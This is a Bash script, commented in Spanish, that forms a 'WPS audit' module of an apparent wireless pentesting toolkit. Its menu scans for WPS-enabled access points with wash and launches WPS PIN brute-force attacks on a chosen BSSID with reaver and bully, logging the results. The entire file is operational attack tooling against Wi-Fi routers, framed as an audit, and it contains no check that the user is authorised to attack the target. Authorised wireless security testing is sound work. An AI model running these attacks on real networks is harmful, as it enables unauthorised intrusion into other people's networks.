#!/bin/bash

# wps.sh - Módulo para auditoría WPS

source ../assets/colors.sh

# Función para verificar si una interfaz está en modo monitor
is_monitor_mode() {
  INTERFACE=$1
  if iwconfig "$INTERFACE" | grep -q "Mode:Monitor"; then
    return 0 # Está en modo monitor
  else
    return 1 # No está en modo monitor
  fi
}

# Función para escanear puntos de acceso con WPS habilitado usando wash
scan_wps() {
  print_yellow "[*] Escaneando puntos de acceso con WPS habilitado usando wash."
  read -p "Ingrese la interfaz en modo monitor (ej. wlan0mon): " monitor_interface

  if ! is_monitor_mode "$monitor_interface"; then
    print_red "[-] La interfaz \'$monitor_interface\' no está en modo monitor. Por favor, active el modo monitor primero."
    return 1
  fi

  print_green "[+] Iniciando wash en \'$monitor_interface\'. Presione Ctrl+C para detener."
  sudo wash -i "$monitor_interface" -C | tee ../logs/wps_scan_$(date +%F_%H-%M-%S).txt
  print_green "[+] Escaneo WPS con wash finalizado. Resultados guardados en ../logs/wps_scan_*.txt"
}

# Función para realizar ataque WPS con reaver
attack_wps_reaver() {
  print_yellow "[*] Iniciando ataque WPS con reaver."
  read -p "Ingrese la interfaz en modo monitor (ej. wlan0mon): " monitor_interface

  if ! is_monitor_mode "$monitor_interface"; then
    print_red "[-] La interfaz \'$monitor_interface\' no está en modo monitor. Por favor, active el modo monitor primero."
    return 1
  fi

  read -p "Ingrese el BSSID del punto de acceso objetivo (ej. AA:BB:CC:DD:EE:FF): " target_bssid

  print_green "[+] Iniciando reaver en \'$monitor_interface\' contra \'$target_bssid\'."
  sudo reaver -i "$monitor_interface" -b "$target_bssid" -vv -o ../logs/wps_reaver_$(date +%F_%H-%M-%S).log
  print_green "[+] Ataque WPS con reaver finalizado. Log guardado en ../logs/wps_reaver_*.log"
}

# Función para realizar ataque WPS con bully
attack_wps_bully() {
  print_yellow "[*] Iniciando ataque WPS con bully."
  read -p "Ingrese la interfaz en modo monitor (ej. wlan0mon): " monitor_interface

  if ! is_monitor_mode "$monitor_interface"; then
    print_red "[-] La interfaz \'$monitor_interface\' no está en modo monitor. Por favor, active el modo monitor primero."
    return 1
  fi

  read -p "Ingrese el BSSID del punto de acceso objetivo (ej. AA:BB:CC:DD:EE:FF): " target_bssid

  print_green "[+] Iniciando bully en \'$monitor_interface\' contra \'$target_bssid\'."
  sudo bully -b "$target_bssid" -c 1 -F -v 3 "$monitor_interface" | tee ../logs/wps_bully_$(date +%F_%H-%M-%S).log
  print_green "[+] Ataque WPS con bully finalizado. Log guardado en ../logs/wps_bully_*.log"
}

# Menú del módulo de auditoría WPS
wps_menu() {
  while true; do
    clear
    print_green "================================================================================"
    print_green "                            MÓDULO DE AUDITORÍA WPS                           "
    print_green "================================================================================"
    echo -e "\n${C_CYAN}Seleccione una opción:${C_NC}"
    echo -e "  ${C_YELLOW}1.${C_NC} Escanear WPS con wash"
    echo -e "  ${C_YELLOW}2.${C_NC} Atacar WPS con reaver"
    echo -e "  ${C_YELLOW}3.${C_NC} Atacar WPS con bully"
    echo -e "  ${C_RED}0.${C_NC} Volver al menú principal\n"
    print_green "================================================================================"

    read -p "Opción: " wps_choice

    case $wps_choice in
      1) scan_wps ;;
      2) attack_wps_reaver ;;
      3) attack_wps_bully ;;
      0) break ;;
      *) print_red "Opción inválida. Presione cualquier tecla para continuar..."; read -n 1 ;;
    esac
    print_blue "Presione cualquier tecla para continuar..."
    read -n 1
  done
}

wps_menu

